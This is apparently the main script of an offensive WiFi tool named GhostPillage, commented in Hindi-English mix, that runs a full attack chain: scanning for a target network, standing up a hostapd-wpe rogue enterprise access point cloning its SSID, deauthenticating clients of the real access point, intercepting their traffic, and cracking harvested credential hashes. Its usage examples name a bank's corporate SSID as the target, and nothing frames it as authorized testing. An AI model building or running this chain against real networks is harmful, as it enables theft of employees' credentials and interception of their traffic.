#!/usr/bin/env python3
"""
GhostPillage — GhostAP + WiFiPillage Combined Tool
Zero Budget | Kali Linux | Python3 + hostapd-wpe + Bettercap

Yeh main CLI entry point hai. User se input leta hai aur 
dusre modules ko call karta hai based on chosen attack mode.
"""

import os
import sys
import argparse
import time
import subprocess
from datetime import datetime
from utils.helpers import check_root, check_tools, log
from recon.scanner import WiFiScanner
from ghostap.hostapd_config import HostapdConfig
from ghostap.deauth import DeauthEngine
from pillage.mitm import MITMEngine
from crack.hash_cracker import HashCracker


class GhostPillage:
    """
    Main controller class.
    Saare modules yahan se orchestrate hote hain.
    """
    
    def __init__(self, args):
        """
        Args:
            args: CLI arguments parsed by argparse
        """
        self.args = args
        self.interface = args.interface
        self.ssid = args.ssid
        self.channel = args.channel
        self.target_bssid = args.target_bssid
        self.target_channel = args.target_channel
        self.mode = args.mode
        self.verbose = args.verbose
        self.config_dir = "/tmp/ghostpillage"
        
        # Ensure config directory exists
        os.makedirs(self.config_dir, exist_ok=True)
        
        # Setup logging
        self.log_file = f"{self.config_dir}/ghostpillage_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        log(self.log_file, "[+] GhostPillage initialized", self.verbose)
        log(self.log_file, f"[+] Interface: {self.interface}, SSID: {self.ssid}, Mode: {self.mode}", self.verbose)
    
    
    def run_recon(self):
        """
        Phase 1: WiFi Environment Reconnaissance
        
        Target network ke baare mein information collect karta hai:
        - Channel, BSSID, client count
        - Enterprise vs Personal
        - Encryption type
        
        Returns:
            dict: Scan results with target info
        """
        print("\n" + "="*60)
        print("  [PHASE 1] WiFi Environment Reconnaissance")
        print("="*60)
        
        scanner = WiFiScanner(self.interface, self.config_dir, self.verbose)
        scan_results = scanner.scan_environment(self.ssid, timeout=30)
        
        if scan_results:
            log(self.log_file, f"[+] Recon complete: {len(scan_results)} networks found", self.verbose)
            print(f"\n[+] Target network found: {self.ssid}")
            print(f"    Channel: {scan_results.get('channel', 'N/A')}")
            print(f"    BSSID: {scan_results.get('bssid', 'N/A')}")
            print(f"    Encryption: {scan_results.get('encryption', 'N/A')}")
            print(f"    Clients: {scan_results.get('clients', 0)}")
        else:
            log(self.log_file, f"[!] Target SSID '{self.ssid}' not found in scan", self.verbose)
            print(f"\n[!] Warning: Could not find SSID '{self.ssid}' in scan results")
            print("    Continuing with manual configuration...")
        
        return scan_results
    
    
    def run_ghostap(self, scan_results=None):
        """
        Phase 2: Rogue Access Point Setup
        
        hostapd-wpe ka config generate karta hai aur 
        fake enterprise AP create karta hai.
        
        Args:
            scan_results (dict): Optional scan results from recon phase
        """
        print("\n" + "="*60)
        print("  [PHASE 2] GhostAP — Rogue Enterprise AP Setup")
        print("="*60)
        
        # Generate hostapd-wpe configuration
        config_gen = HostapdConfig(self.interface, self.ssid, self.channel, 
                                   self.config_dir, self.verbose)
        config_file = config_gen.generate_config()
        
        log(self.log_file, f"[+] hostapd-wpe config written to: {config_file}", self.verbose)
        print(f"\n[+] Rogue AP configuration ready")
        print(f"    SSID: {self.ssid}")
        print(f"    Channel: {self.channel}")
        print(f"    Interface: {self.interface}")
        print(f"    Config: {config_file}")
        
        # Deauth original AP clients (if target info available)
        if scan_results and scan_results.get('bssid'):
            self.run_deauth(scan_results['bssid'], scan_results.get('channel', self.channel))
        
        # Start the rogue AP
        print("\n[+] Starting GhostAP (press Ctrl+C to stop)...")
        print("    Waiting for client connections...\n")
        
        try:
            # Run hostapd-wpe in foreground
            cmd = f"hostapd-wpe {config_file}"
            if self.verbose:
                log(self.log_file, f"[+] Running: {cmd}", self.verbose)
            
            subprocess.run(cmd, shell=True, check=True)
            
        except KeyboardInterrupt:
            print("\n\n[!] User interrupted. Stopping GhostAP...")
        except subprocess.CalledProcessError as e:
            log(self.log_file, f"[!] hostapd-wpe error: {e}", self.verbose)
            print(f"\n[!] Error running hostapd-wpe: {e}")
        except FileNotFoundError:
            log(self.log_file, "[!] hostapd-wpe not found. Install: apt install hostapd-wpe", self.verbose)
            print("\n[!] hostapd-wpe not installed!")
            print("    Run: sudo apt install hostapd-wpe")
        
        log(self.log_file, "[+] GhostAP phase complete", self.verbose)
    
    
    def run_deauth(self, target_bssid, target_channel):
        """
        Phase 2b: Client Deauthentication
        
        Real AP ke clients ko disconnect karta hai taki 
        woh rogue AP se connect karein.
        
        Args:
            target_bssid (str): Real AP ka BSSID
            target_channel (int): Real AP ka channel
        """
        print("\n" + "-"*40)
        print("  [DEAUTH] Disconnecting real AP clients...")
        print("-"*40)
        
        deauth = DeauthEngine(self.interface, self.config_dir, self.verbose)
        deauth.start_deauth(target_bssid, target_channel, interval=5)
        
        log(self.log_file, f"[+] Deauth started on {target_bssid} (ch {target_channel})", self.verbose)
    
    
    def run_pillage(self):
        """
        Phase 3: Client Traffic Interception
        
        Bettercap ya Responder ke through connected clients ka 
        traffic intercept karta hai.
        """
        print("\n" + "="*60)
        print("  [PHASE 3] Client Pillage — Traffic Interception")
        print("="*60)
        
        # FIXED: MITMEngine(config_dir, verbose) — pehle argument interface tha jo constructor nahi leta
        # FIXED: start_interception() does not accept interface= kwarg
        mitm = MITMEngine(
            self.interface,
            self.config_dir,
            self.verbose
            )
        mitm.start_interception(mode="auto")
        
        log(self.log_file, "[+] Pillage phase executed", self.verbose)
    
    
    def run_crack(self, hash_file=None):
        """
        Phase 4: Hash Cracking
        
        Captured credentials ko crack karta hai.
        
        Args:
            hash_file (str): Optional path to hash file
        """
        print("\n" + "="*60)
        print("  [PHASE 4] Credential Cracking")
        print("="*60)
        
        # Auto-detect hash file if not specified
        if not hash_file:
            # Check hostapd-wpe log for captured hashes
            log_path = "/tmp/hostapd-wpe/hostapd-wpe.log"
            if os.path.exists(log_path):
                hash_file = log_path
        
        if hash_file and os.path.exists(hash_file):
            cracker = HashCracker(self.config_dir, self.verbose)
            cracker.extract_and_crack(hash_file)
            log(self.log_file, f"[+] Cracked credentials from: {hash_file}", self.verbose)
        else:
            log(self.log_file, "[!] No hash file found to crack", self.verbose)
            print("\n[!] No hashes found to crack.")
            print("    Run GhostAP first to capture credentials.")
    
    
    def run_all(self):
        """
        Run complete attack chain in sequence:
        1. Recon → 2. GhostAP (with deauth) → 3. Pillage → 4. Crack
        """
        print("\n" + "🔥"*20)
        print("  GhostPillage — Full Attack Chain")
        print("🔥"*20)
        
        # Phase 1: Recon
        scan_results = self.run_recon()
        
        # Phase 2: GhostAP (this includes deauth and waits for connections)
        self.run_ghostap(scan_results)
        
        # Phase 3: Pillage (after ghostap stops)
        self.run_pillage()
        
        # Phase 4: Crack
        self.run_crack()
        
        print("\n" + "="*60)
        print("  [COMPLETE] GhostPillage attack finished")
        print("="*60)


def main():
    """
    Main function — CLI argument parsing aur execution.
    """
    parser = argparse.ArgumentParser(
        description="GhostPillage — GhostAP + WiFiPillage Combined Offensive Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full attack chain
  python3 main.py --interface wlan0 --ssid "ICICI-Bank-Corp" --mode all
  
  # Only recon
  python3 main.py --interface wlan0 --ssid "ICICI-Bank-Corp" --mode recon
  
  # Only GhostAP (rogue AP + credential harvesting)
  python3 main.py --interface wlan0 --ssid "ICICI-Bank-Corp" --mode ghostap
  
  # Only crack captured hashes
  python3 main.py --interface wlan0 --mode crack --hash-file /tmp/hashes.txt
        """
    )
    
    # Required arguments
    parser.add_argument("--interface", "-i", required=True,
                        help="WiFi interface in monitor mode (e.g., wlan0)")
    parser.add_argument("--ssid", "-s", 
                        help="Target SSID to clone")
    
    # Optional arguments
    parser.add_argument("--channel", "-c", type=int, default=6,
                        help="Channel for rogue AP (default: 6)")
    parser.add_argument("--target-bssid", 
                        help="Real AP BSSID for deauth targeting")
    parser.add_argument("--target-channel", type=int,
                        help="Real AP channel (default: same as --channel)")
    
    # Mode selection
    parser.add_argument("--mode", "-m", 
                        choices=["recon", "ghostap", "pillage", "crack", "all"],
                        default="all",
                        help="Attack mode (default: all)")
    
    # Optional flags
    parser.add_argument("--verbose", "-v", action="store_true",
                        help="Enable verbose logging")
    parser.add_argument("--hash-file", 
                        help="Path to hash file for cracking mode")
    
    args = parser.parse_args()
    
    # Validate: SSID required unless mode is crack
    if args.mode != "crack" and not args.ssid:
        parser.error("--ssid is required for modes: recon, ghostap, pillage, all")
    
    # Check root privileges
    if not check_root():
        print("[!] This tool requires root privileges.")
        print("    Run: sudo python3 main.py [options]")
        sys.exit(1)
    
    # Check required tools are installed
    required_tools = ["aircrack-ng", "hostapd-wpe"]
    missing_tools = check_tools(required_tools)
    if missing_tools:
        print(f"[!] Missing required tools: {', '.join(missing_tools)}")
        print(f"    Install with: sudo apt install {' '.join(missing_tools)}")
        sys.exit(1)
    
    # Initialize GhostPillage
    gp = GhostPillage(args)
    
    # Execute based on mode
    try:
        if args.mode == "recon":
            gp.run_recon()
        elif args.mode == "ghostap":
            gp.run_ghostap()
        elif args.mode == "pillage":
            gp.run_pillage()
        elif args.mode == "crack":
            gp.run_crack(args.hash_file)
        elif args.mode == "all":
            gp.run_all()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user. Exiting...")
    except Exception as e:
        log(gp.log_file, f"[!] Fatal error: {e}", True)
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()